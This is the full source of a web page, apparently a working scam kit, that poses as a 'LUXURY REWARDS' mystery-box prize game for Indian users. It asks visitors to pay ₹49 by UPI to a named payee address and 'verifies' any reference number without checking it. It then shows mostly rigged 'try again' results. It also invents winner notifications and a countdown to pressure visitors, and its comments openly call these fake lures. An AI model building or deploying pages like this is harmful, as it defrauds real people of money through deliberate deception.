<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ðŸ’° LUXURY REWARDS | Unlock Your Prize</title>
    <style>
        :root {
            --primary: #6a00f4;
            --primary-dark: #4a00b0;
            --secondary: #ff00aa;
            --text: #ffffff;
            --bg: #0a0a0a;
            --bg-light: #1a1a1a;
            --glow: 0 0 15px rgba(106, 0, 244, 0.7);
            --gold: #FFD700;
            --silver: #C0C0C0;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }

        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }

        @keyframes shake {
            0% { transform: rotate(0deg); }
            25% { transform: rotate(5deg); }
            50% { transform: rotate(0deg); }
            75% { transform: rotate(-5deg); }
            100% { transform: rotate(0deg); }
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background-color: var(--bg);
            color: var(--text);
            min-height: 100vh;
            overflow-x: hidden;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(106, 0, 244, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(255, 0, 170, 0.15) 0%, transparent 50%);
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-top: 10px;
        }

        .logo {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .countdown {
            font-size: 14px;
            background-color: var(--bg-light);
            padding: 8px 12px;
            border-radius: 20px;
            font-weight: 600;
            border: 1px solid rgba(106, 0, 244, 0.3);
            animation: pulse 2s infinite;
        }

        .countdown span {
            color: var(--secondary);
            font-weight: 700;
        }

        .box-container {
            position: relative;
            margin: 30px auto;
            width: 250px;
            height: 250px;
            perspective: 1000px;
        }

        .box {
            position: relative;
            width: 100%;
            height: 100%;
            transform-style: preserve-3d;
            transition: transform 0.8s;
            cursor: pointer;
            animation: float 3s ease-in-out infinite;
        }

        .box.flipped {
            transform: rotateY(180deg);
        }

        .box-front, .box-back {
            position: absolute;
            width: 100%;
            height: 100%;
            backface-visibility: hidden;
            border-radius: 15px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: var(--glow);
            overflow: hidden;
        }

        .box-front {
            background: linear-gradient(135deg, var(--primary-dark), var(--primary));
            border: 2px solid rgba(255, 255, 255, 0.1);
            flex-direction: column;
            padding: 20px;
            text-align: center;
        }

        .box-back {
            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
            transform: rotateY(180deg);
            padding: 20px;
            text-align: center;
        }

        .box-label {
            font-size: 80px;
            font-weight: 700;
            color: white;
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8);
            margin-bottom: 10px;
        }

        .payment-section, .result-section {
            display: none;
        }

        .active-section {
            display: block;
        }

        .input-field {
            background: rgba(255,255,255,0.1);
            border: 1px solid var(--primary);
            color: white;
            padding: 12px;
            border-radius: 8px;
            width: 100%;
            margin: 10px 0;
            text-align: center;
        }

        .cta-btn {
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            max-width: 350px;
            box-shadow: 0 5px 25px rgba(106, 0, 244, 0.5);
            margin: 15px 0;
            transition: all 0.3s;
        }

        .cta-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 30px rgba(106, 0, 244, 0.8);
        }

        .cta-btn:active {
            transform: translateY(1px);
        }

        .notifications {
            margin: 40px 0;
            background-color: var(--bg-light);
            padding: 15px;
            border-radius: 10px;
            border: 1px solid rgba(106, 0, 244, 0.2);
        }

        .notification {
            padding: 10px 0;
            font-size: 14px;
            border-bottom: 1px solid rgba(106, 0, 244, 0.1);
            display: flex;
            align-items: center;
        }

        .notification:last-child {
            border-bottom: none;
        }

        .username {
            color: var(--secondary);
            font-weight: 700;
            margin-right: 5px;
        }

        .prize-amount {
            color: var(--gold);
            font-weight: 700;
        }

        .vip-badge {
            display: inline-block;
            background: linear-gradient(90deg, var(--gold), var(--silver));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 700;
            margin-left: 5px;
        }

        .result-content {
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .result-title {
            font-size: 24px;
            margin-bottom: 15px;
            color: var(--secondary);
            font-weight: 700;
        }

        .result-prize {
            font-size: 28px;
            color: var(--gold);
            font-weight: 700;
            margin: 10px 0;
            text-align: center;
        }

        .try-again-btn {
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 30px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 20px;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="logo">LUXURY REWARDS</div>
            <div class="countdown">
                <span id="timer">00:10</span> until next unlock
            </div>
        </header>

        <main>
            <div class="box-container">
                <div class="box" id="mystery-box">
                    <div class="box-front">
                        <div class="box-label">?</div>
                        <div class="payment-section active-section" id="payment-section">
                            <p>Pay â‚¹49 to unlock your reward!</p>
                            <button id="pay-btn" class="cta-btn">Pay Now</button>
                        </div>
                        <div class="result-section hidden" id="result-section">
                            <div class="result-content">
                                <div id="result-title" class="result-title"></div>
                                <div id="result-prize" class="result-prize"></div>
                                <button id="try-again-btn" class="try-again-btn">Try Again</button>
                            </div>
                        </div>
                    </div>
                    <div class="box-back hidden">
                        <div class="verification-section" id="verification-section">
                            <p>Enter your 12-digit payment reference:</p>
                            <input type="text" id="ref-input" class="input-field" placeholder="XXXXXXXXXXXX" maxlength="12">
                            <button id="verify-btn" class="cta-btn">Verify Payment</button>
                        </div>
                    </div>
                </div>
            </div>

            <div class="notifications">
                <div class="notification">
                    <span class="username">Winner_23</span> won <span class="prize-amount">â‚¹1,00,000 CASH</span> <span class="vip-badge">VIP</span>
                </div>
                <div class="notification">
                    <span class="username">LuckyUser_7</span> got <span class="prize-amount">â‚¹50,000 INSTANT PAYOUT</span>
                </div>
                <div class="notification">
                    <span class="username">NewWinner_45</span> unlocked <span class="prize-amount">â‚¹25,000 REWARD</span>
                </div>
            </div>
        </main>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const mysteryBox = document.getElementById('mystery-box');
            const payBtn = document.getElementById('pay-btn');
            const verifyBtn = document.getElementById('verify-btn');
            const tryAgainBtn = document.getElementById('try-again-btn');
            const refInput = document.getElementById('ref-input');
            const paymentSection = document.getElementById('payment-section');
            const verificationSection = document.getElementById('verification-section');
            const resultSection = document.getElementById('result-section');
            const resultTitle = document.getElementById('result-title');
            const resultPrize = document.getElementById('result-prize');
            
            // Enticing prizes (mostly "try again" with occasional big wins)
            const prizes = [
                { title: "Better luck next time!", prize: "Try again for bigger rewards!" },
                { title: "Almost won!", prize: "â‚¹10,000 was so close!" },
                { title: "VIP Member Unlocked!", prize: "Try again for â‚¹1,00,000" },
                { title: "Congratulations!", prize: "You won â‚¹1,00,000 CASH!" }, // Rare
                { title: "Jackpot Nearby!", prize: "Next try could win â‚¹50,000" },
                { title: "Daily Reward!", prize: "Come back tomorrow to try again" }
            ];
            
            // Payment apps (just opens main app)
            const paymentApps = [
                'https://gpay.app.goo.gl/',
                'phonepe://',
                'paytmmp://',
                'bhim://'
            ];
            
            // Pay button - opens payment app
            payBtn.addEventListener('click', function() {
                // Flip box to show verification
                mysteryBox.classList.add('flipped');
                
                // Try opening payment apps
                let opened = false;
                paymentApps.forEach(app => {
                    if (!opened) {
                        window.location.href = app;
                        setTimeout(() => {
                            if (!document.hidden) opened = false;
                            else opened = true;
                        }, 300);
                    }
                });
                
                // Fallback if no apps opened
                setTimeout(() => {
                    if (!opened) {
                        alert('Please manually open your payment app and send â‚¹49 to: keanjohn72@oksbi');
                    }
                }, 1000);
            });
            
            // Verify button - accepts any 12-digit number
            verifyBtn.addEventListener('click', function() {
                if (refInput.value.length >= 11 && refInput.value.length <= 20) {
                    // Show loading animation
                    verifyBtn.textContent = 'Verifying...';
                    
                    // Simulate verification delay
                    setTimeout(() => {
                        // Flip box back to show result
                        mysteryBox.classList.remove('flipped');
                        paymentSection.classList.add('hidden');
                        resultSection.classList.remove('hidden');
                        
                        // Show random result (mostly "try again" messages)
                        const randomPrize = Math.random() > 0.9 ? prizes[3] : prizes[Math.floor(Math.random() * (prizes.length - 1))];
                        resultTitle.textContent = randomPrize.title;
                        resultPrize.textContent = randomPrize.prize;
                        
                        // Reset verify button
                        verifyBtn.textContent = 'Verify Payment';
                        refInput.value = '';
                    }, 1500);
                } else {
                    alert('Please enter a valid 12-digit reference number');
                }
            });
            
            // Try again button
            tryAgainBtn.addEventListener('click', function() {
                resultSection.classList.add('hidden');
                paymentSection.classList.remove('hidden');
            });
            
            // Timer with fake stock countdown
            let seconds = 10;
            const timerElement = document.getElementById('timer');
            
            setInterval(() => {
                seconds--;
                if (seconds <= 0) {
                    seconds = 10;
                    // Update notifications with fake wins
                    const notifications = document.querySelectorAll('.notification');
                    notifications[2].innerHTML = notifications[1].innerHTML;
                    notifications[1].innerHTML = notifications[0].innerHTML;
                    
                    // Big prizes to lure users
                    const bigPrizes = [
                        'â‚¹1,00,000 CASH PRIZE',
                        'â‚¹50,000 INSTANT TRANSFER',
                        'â‚¹25,000 REWARD MONEY'
                    ];
                    const randomUser = `User_${Math.floor(Math.random() * 900) + 100}`;
                    const randomPrize = bigPrizes[Math.floor(Math.random() * bigPrizes.length)];
                    
                    notifications[0].innerHTML = `
                        <span class="username">${randomUser}</span> won <span class="prize-amount">${randomPrize}</span> <span class="vip-badge">VIP</span>
                    `;
                    
                    // Shake box for big wins
                    mysteryBox.style.animation = 'shake 0.5s ease-in-out';
                    setTimeout(() => {
                        mysteryBox.style.animation = 'float 3s ease-in-out infinite';
                    }, 500);
                }
                timerElement.textContent = `00:${seconds.toString().padStart(2, '0')}`;
            }, 1000);
        });
    </script>
</body>
</html>
